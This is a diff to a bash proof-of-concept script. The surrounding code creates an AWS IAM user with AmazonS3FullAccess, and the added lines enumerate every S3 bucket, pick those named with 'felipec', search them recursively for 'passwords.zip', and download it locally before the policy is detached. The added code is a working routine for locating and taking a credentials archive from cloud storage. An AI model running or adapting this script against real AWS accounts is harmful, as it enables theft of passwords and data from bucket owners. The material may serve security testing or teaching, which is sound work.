@@ -4,6 +4,7 @@
 policy_name="AmazonS3FullAccess"
 policy_arn="arn:aws:iam::aws:policy/$policy_name"
 user_name="poc"
+download_dir="./downloads"
 
 # Create a User
 echo "Creating user..."
@@ -22,6 +23,40 @@ else
   echo "Error creating security group."
   exit 1
 fi
+
+# List S3 buckets
+echo "Listing S3 buckets..."
+buckets=$(aws s3 ls | awk '{print $3}')
+
+# Create download directory if it doesn't exist
+mkdir -p $download_dir
+
+# Iterate through each bucket
+for bucket in $buckets; do
+    # Check if the bucket name contains "felipec"
+    if [[ "$bucket" == *"felipec"* ]]; then
+        echo "Searching for passwords.zip in bucket: $bucket"
+        
+        # List objects in the bucket, recursively
+        objects=$(aws s3 ls s3://"$bucket" --recursive)
+        
+        # Check if passwords.zip exists in the bucket
+        if echo "$objects" | grep -q "passwords.zip"; then
+            echo "passwords.zip found in bucket: $bucket"
+            
+            # Extract the file path
+            file_path=$(echo "$objects" | grep "passwords.zip" | awk '{print $NF}')
+            
+            # Download passwords.zip
+            aws s3 cp "s3://$bucket/$file_path" $download_dir/
+            
+            echo "passwords.zip downloaded from bucket: $bucket"
+            break
+        else
+            echo "passwords.zip not found in bucket: $bucket"
+        fi
+    fi
+done
 
 # Detach policy from a user
 echo "Detaching policy $policy_name from user $user_name..."
